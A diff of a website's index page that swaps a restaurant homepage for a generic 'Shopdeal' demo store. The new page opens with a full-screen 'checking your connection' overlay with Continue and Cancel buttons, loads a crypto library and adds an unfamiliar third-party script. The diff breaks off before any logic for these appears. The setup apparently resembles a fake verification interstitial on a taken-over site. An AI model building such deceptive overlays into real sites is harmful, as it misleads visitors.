@@ -1,824 +1,749 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Artisanal Heirloom Pulses & Botanical Gastronomy — Lentilpalate</title>
-  <meta name="description" content="Slow-simmered in hand-thrown clay pots from single-estate Le Puy green lentils, volcanic Castelluccio lentils, and black Beluga pearls at 181 Mercer Street.">
-  <link rel="canonical" href="https://lentilpalate.com/">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Help0x0x-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/assets/css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-  <!-- Top Botanical Gastronomy Ticker (Paid Lentil Theme) -->
-  <div class="announcement-bar" style="background: #09100E; color: #F9F7F2; border-bottom: 1px solid rgba(217, 119, 6, 0.3);">
-    <span>◈ THE HEIRLOOM PULSE DEGUSTATION &bull; BOTANICAL GASTRONOMY AT 181 MERCER STREET &bull; TEL: +1-888-777-5845 &bull; CONCIERGE@LENTILPALATE.COM</span>
-  </div>
 
-  <!-- Mandatory Global Site Header (Exactly 1 per page) -->
-  <header class="site-header">
-    <div class="header-container">
-      <a href="/" class="brand-logo" aria-label="Lentilpalate Home">
-        <span class="logo-mark">◈</span>
-        <span class="logo-text">Lentilpalate</span>
-      </a>
-      <nav class="desktop-nav" aria-label="Primary Navigation">
-        <a href="/" class="nav-link active">Home</a>
-        <a href="/about.html" class="nav-link">The Atelier</a>
-        <a href="/collection.html" class="nav-link">Collections</a>
-        <a href="/blog.html" class="nav-link">Treatises</a>
-        <a href="/contact.html" class="nav-link">Concierge</a>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're checking your connection.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
+
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
       </nav>
-      <div class="header-actions">
-        <a href="/collection.html" class="btn btn-sm btn-outline">Explore Catalog</a>
-        <button id="drawer-toggle" class="mobile-toggle" aria-label="Open Navigation Menu">
-          <span class="hamburger-bar"></span>
-          <span class="hamburger-bar"></span>
-          <span class="hamburger-bar"></span>
-        </button>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
+        </div>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-  </header>
 
-  <!-- Mandatory Mobile Navigation Drawer (Exactly 1 per page) -->
-  <div class="mobile-drawer" id="mobile-drawer" aria-hidden="true">
-    <div class="drawer-header">
-      <div class="drawer-brand">Lentilpalate</div>
-      <button id="drawer-close" class="drawer-close-btn" aria-label="Close Navigation Menu">&times;</button>
-    </div>
-    <nav class="drawer-nav" aria-label="Mobile Navigation">
-      <a href="/" class="drawer-link active">Home</a>
-      <a href="/about.html" class="drawer-link">The Atelier &amp; Craft</a>
-      <a href="/collection.html" class="drawer-link">Curated Heirloom Pulse Vitrine</a>
-      <a href="/blog.html" class="drawer-link">Sartorial Treatises</a>
-      <a href="/contact.html" class="drawer-link">Private Concierge</a>
-    </nav>
-    <div class="drawer-footer">
-      <p class="drawer-contact-title">Manhattan Atelier &amp; Suite</p>
-      <p class="drawer-contact-info">181 Mercer Street, New York, NY 10012, United States</p>
-      <p class="drawer-contact-info">Tel: +1-888-777-5845</p>
-      <p class="drawer-contact-info">Email: concierge@lentilpalate.com</p>
-    </div>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-  <div id="drawer-overlay" class="drawer-overlay"></div>
 
-  <!-- SECTION 1: HAUTE BOTANICAL HERO SHOWCASE (THE ANCIENT SEED) -->
-  <section class="section" style="padding: 5.5rem 0 6rem; background: linear-gradient(180deg, #EFECE3 0%, #F9F7F2 100%);">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1.15fr 1fr; gap: 4rem; align-items: center;">
-        <div>
-          <span style="display: inline-block; background: #E8EFE9; color: #166534; border: 1px solid rgba(22, 101, 52, 0.3); padding: 0.35rem 0.95rem; font-size: 0.78rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; border-radius: 50px; margin-bottom: 1.2rem;">
-            HEIRLOOM PULSES &bull; BOTANICAL GASTRONOMY
-          </span>
-          <h1 style="margin-bottom: 1.2rem; font-size: clamp(2.4rem, 4.5vw, 3.8rem); line-height: 1.15; color: #0F1715;">
-            The Alchemy of the Ancient Seed: Heirloom Pulses &amp; Botanical Gastronomy
-          </h1>
-          <p class="lead" style="margin-bottom: 1.8rem; font-size: 1.12rem; line-height: 1.75; color: #323E3A;">
-            Slow-simmered in hand-thrown clay pots from single-estate Le Puy green lentils, volcanic Castelluccio lentils, and black Beluga pearls. Seasoned with whole-seed tempering and cold-pressed infusions at 181 Mercer Street.
-          </p>
-          <div style="display: flex; gap: 1.2rem; flex-wrap: wrap; margin-bottom: 2.2rem; font-size: 0.88rem; color: #43524D;">
-            <span style="display: flex; align-items: center; gap: 0.4rem;"><strong>◈</strong> 8-Hour Clay Pot Braise</span>
-            <span style="display: flex; align-items: center; gap: 0.4rem;"><strong>◈</strong> Single-Estate Terroir Sourcing</span>
-            <span style="display: flex; align-items: center; gap: 0.4rem;"><strong>◈</strong> Bio-Activated Sprouting Protocol</span>
-          </div>
-          <div style="display: flex; gap: 1.2rem; flex-wrap: wrap; align-items: center; margin-bottom: 2.5rem;">
-            <a href="/collection.html" class="btn btn-primary" style="background: #0F1715; color: #F9F7F2 !important;">Reserve Degustation Table &rarr;</a>
-            <a href="/about.html" class="btn btn-outline" style="border-color: #0F1715; color: #0F1715 !important;">The Mercer Culinary Lab</a>
-          </div>
-          <div style="display: flex; align-items: center; gap: 1rem; padding-top: 1.5rem; border-top: 1px solid var(--color-border);">
-            <div style="color: #D97706; font-size: 1.1rem; letter-spacing: 0.1em;">★★★★★</div>
-            <div style="font-size: 0.86rem; color: #43524D;">
-              <strong>4.99 / 5.0 Rating</strong> &bull; Celebrated in Botanical Gastronomy Gazette &amp; Michelin Guide
-            </div>
-          </div>
-        </div>
-        <div style="position: relative;">
-          <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-lg); border: 1px solid var(--color-border); background: #FFF;">
-            <img src="/assets/images/coriander_seeds_rustic.jpg" alt="Lentilpalate heirloom organic pulses and rustic seeds" style="width: 100%; height: auto;">
-          </div>
-          <div style="position: absolute; bottom: -1rem; left: 1.5rem; background: #FFFFFF; border: 1px solid var(--color-border); padding: 0.85rem 1.4rem; border-radius: var(--radius-sm); box-shadow: var(--shadow-md); display: flex; align-items: center; gap: 0.8rem;">
-            <span style="font-size: 1.3rem;">🌿</span>
-            <div>
-              <div style="font-weight: 700; font-size: 0.88rem; color: #0F1715;">MERCER BOTANICAL LAB</div>
-              <div style="font-size: 0.78rem; color: #166534;">181 Mercer St, New York &bull; Ancestral Seed Heritage</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- SECTION 2: THE FOUR HEIRLOOM PULSE CULTIVARS (PILLARS) -->
-  <section class="section" style="padding: 5rem 0; background: #FFFFFF;">
-    <div class="container">
-      <div class="text-center" style="max-width: 760px; margin: 0 auto 3.5rem;">
-        <span style="color: #166534; font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; display: inline-block; margin-bottom: 0.6rem;">
-          ANCESTRAL PULSE TYPOLOGIES
-        </span>
-        <h2 style="font-size: 2.4rem; margin-bottom: 1rem; color: #0F1715;">Four Master Heirloom Cultivars</h2>
-        <p style="color: #43524D; font-size: 1.05rem;">
-          From volcanic French Le Puy slopes to high-altitude Umbrian fields, each variety is cultivated for unique skin resilience and mineral richness.
-        </p>
-      </div>
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 2rem;">
-        <div style="background: #F9F7F2; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.2rem 1.8rem;">
-          <div style="font-size: 2rem; margin-bottom: 0.8rem;">🌱</div>
-          <h3 style="font-size: 1.25rem; margin-bottom: 0.6rem; color: #0F1715;">Volcanic Le Puy Green</h3>
-          <p style="font-size: 0.92rem; color: #43524D; line-height: 1.6; margin-bottom: 1rem;">
-            Harvested from mineral-rich basalt soils in Auvergne. Holds firm al-dente integrity with peppery flint notes after braising.
-          </p>
-          <div style="font-size: 0.84rem; color: #D97706; font-weight: 700;">AOP Certified &bull; Basalt Terroir</div>
-        </div>
-        <div style="background: #F9F7F2; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.2rem 1.8rem;">
-          <div style="font-size: 2rem; margin-bottom: 0.8rem;">🌾</div>
-          <h3 style="font-size: 1.25rem; margin-bottom: 0.6rem; color: #0F1715;">Umbrian Castelluccio Umber</h3>
-          <p style="font-size: 0.92rem; color: #43524D; line-height: 1.6; margin-bottom: 1rem;">
-            Micro-grain lentils from 1,500m Italian alpine plateaus with whisper-thin skins and buttery, melt-in-mouth interiors.
-          </p>
-          <div style="font-size: 0.84rem; color: #D97706; font-weight: 700;">IGP Heritage &bull; Alpine Plateau</div>
-        </div>
-        <div style="background: #F9F7F2; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.2rem 1.8rem;">
-          <div style="font-size: 2rem; margin-bottom: 0.8rem;">🌑</div>
-          <h3 style="font-size: 1.25rem; margin-bottom: 0.6rem; color: #0F1715;">Black Beluga Pearls</h3>
-          <p style="font-size: 0.92rem; color: #43524D; line-height: 1.6; margin-bottom: 1rem;">
-            Glossy anthocyanin-dense seed pearls that glisten like caviar, braised slowly with forest mushroom dashi and shallots.
-          </p>
-          <div style="font-size: 0.84rem; color: #D97706; font-weight: 700;">Anthocyanin-Rich &bull; Caviar Finish</div>
-        </div>
-        <div style="background: #F9F7F2; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.2rem 1.8rem;">
-          <div style="font-size: 2rem; margin-bottom: 0.8rem;">✨</div>
-          <h3 style="font-size: 1.25rem; margin-bottom: 0.6rem; color: #0F1715;">Sun-Sprouted Golden Moong</h3>
-          <p style="font-size: 0.92rem; color: #43524D; line-height: 1.6; margin-bottom: 1rem;">
-            Bio-activated through 48-hour moisture germination, releasing sweet enzymic nectar and light digestive lightness.
